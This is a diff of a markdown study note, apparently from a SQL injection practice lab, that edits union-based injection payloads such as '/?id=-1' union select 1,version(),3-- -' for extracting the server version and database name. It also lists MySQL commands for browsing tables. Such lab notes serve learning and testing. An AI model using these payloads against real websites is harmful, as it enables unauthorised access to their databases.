@@ -21,9 +21,11 @@ We can dump contents
 
  ## ***payloads to dump***
  
-We can get version of the server by using ```/?id=-1' union select 1,version(),3--+```
-We can get databasename of the server by using ```/?id=-1' union select 1,database(),3--+  databasename = security```
-Going to the terminal and going to mysql. If we type ``show databases;`` it shows databases
+We can get version of the server by using ```/?id=-1' union select 1,version(),3-- -```
+
+We can get databasename of the server by using ```/?id=-1' union select 1,database(),3-- -```  databasename = security
+
+Going to the terminal and going to mysql. If we type ``show databases;`` it shows databases,
 Then We can see security which is our database name. We can find more details ``use security`` with this sql command go into the database.
 Using ``show tables;`` we can see the tables. For looking into the tables ``desc emails;`` and so on...
  
